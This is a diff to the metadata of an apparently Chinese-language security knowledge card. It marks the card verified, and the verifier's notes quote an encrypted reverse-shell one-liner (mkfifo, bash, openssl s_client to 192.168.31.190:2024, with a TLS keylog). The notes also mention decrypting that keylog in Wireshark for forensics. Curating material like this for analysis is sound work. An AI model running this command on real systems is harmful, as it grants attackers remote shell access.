@@ -23,9 +23,13 @@ tags:
 cve: []
 severity: high
 confidence: high
-status: draft
+status: verified
 created: '2026-11-07'
 updated: '2026-11-07'
+verification:
+  verified_by: verifier-V261
+  verified_at: '2026-11-07T18:05:26+08:00'
+  notes: 已对照原文核对：正文831行给出mkfifo /tmp/revshell; /bin/bash -i < /tmp/revshell 2>&1 | openssl s_client -quiet -connect 192.168.31.190:2024 -keylogfile key.log > /tmp/revshell; rm -f /tmp/revshell，FAQ 6答案为192.168.31.190|2024；后文说明key.log导入Wireshark追踪TLS流还原第一条命令ls（FAQ 7）。卡内命令、FIFO闭环原理、keylog解密与取证步骤与原文一致。dedup：Socket流泵、bashrc反弹、通用TLS keylog解密卡方向不同（攻击侧TLS反弹+FIFO vs 通用解密/其他载荷）。另：该段外部插图（xzfile链接）未随文下载，依据正文文字核对。未验证点：未搭建s_server/s_client复现。
 ---
 
 ## 一句话结论
